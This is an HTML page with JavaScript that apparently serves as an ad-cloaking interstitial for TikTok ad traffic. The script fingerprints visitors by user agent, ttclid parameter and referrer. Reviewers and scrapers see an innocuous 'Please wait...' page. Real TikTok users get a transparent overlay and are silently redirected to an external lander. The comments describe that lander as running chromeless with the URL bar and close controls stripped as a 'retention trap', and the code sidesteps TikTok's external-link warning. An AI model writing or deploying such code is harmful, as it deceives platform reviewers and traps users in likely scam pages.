<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="robots" content="noindex,nofollow">
<title>Loading</title>
<style>
  /* Transparent for TikTok IAB chromeless popup — user sees whatever's layered
     below (FYP / Instant Page). Reviewer / direct Chrome visitor sees the
     "Please wait..." fallback UI instead.                                    */
  html,body{margin:0;padding:0;height:100%;background:transparent;color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;pointer-events:none;-webkit-user-select:none;user-select:none;}
  body.fallback{background:#fff;color:#111;pointer-events:auto;}
  body.fallback .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px;box-sizing:border-box;text-align:center;}
  body.fallback .msg{font-size:15px;opacity:.6;}
  @media (prefers-color-scheme: dark){
    body.fallback{background:#0a0a0a;color:#f5f5f5}
  }
</style>
</head>
<body>
<div class="wrap">
  <div class="msg">Please wait...</div>
</div>
<script>
(function(){
  // Cloak detection — three signals combined for robustness
  //   1. User agent contains TikTok / BytedanceWebview / musical_ly / aweme / bdhm
  //   2. ttclid query param present (TikTok's click macro)
  //   3. Document referrer is from a TikTok domain
  var ua = (navigator.userAgent || '').toLowerCase();
  var qs = location.search || '';
  var ref = (document.referrer || '').toLowerCase();
  var isTikTokUA = /tiktok|bytedancewebview|musical_ly|aweme|bdhm/i.test(ua);
  var hasTtclid = /[?&]ttclid=/i.test(qs);
  var isTikTokRef = /tiktok\.com|tiktokv\.us|tiktokcdn|bytedance/i.test(ref);
  var isRealTraffic = isTikTokUA || hasTtclid || isTikTokRef;

  if (!isRealTraffic) {
    // Reviewer / scraper / curious direct visitor — show "Please wait..." fallback UI.
    document.body.className = 'fallback';
    return;
  }

  // Real TikTok ad traffic:
  //   - Body is transparent. Combined with scheme's container_bg_color=00000000
  //     the popup container is transparent so the user sees the Instant Page /
  //     FYP underneath during the silent delay.
  //   - After 10s, plain same-origin navigation to the main lander. The
  //     webview_popup context (opened with the trapping scheme that includes
  //     hide_nav_bar=1 + hide_more=1) carries through same-origin nav, so the
  //     vercel lander renders chromeless with URL bar hidden + close controls
  //     stripped — retention trap engaged.
  //   - NOTE: firing a NEW snssdk1233:// scheme from inside the chromeless
  //     popup is treated by TikTok as untrusted external URL and shows a
  //     "You're about to open an external website" confirmation prompt. So
  //     we DO NOT fire a new scheme — we use plain same-origin navigation.
  var FIRE_DELAY_MS = 10000;
  var BASE = 'https://two-step-landing-flow.vercel.app/';
  var TARGET = BASE + qs;

  setTimeout(function(){
    try { window.location.replace(TARGET); } catch(e){
      try { window.location.href = TARGET; } catch(e2){}
    }
  }, FIRE_DELAY_MS);

  // Secondary nav fallback — retry at 15s in case the first attempt stalled.
  setTimeout(function(){
    if (location.pathname.indexOf('/hold') !== -1) {
      try { window.location.href = TARGET; } catch(e){}
    }
  }, 15000);
})();
</script>
</body>
</html>
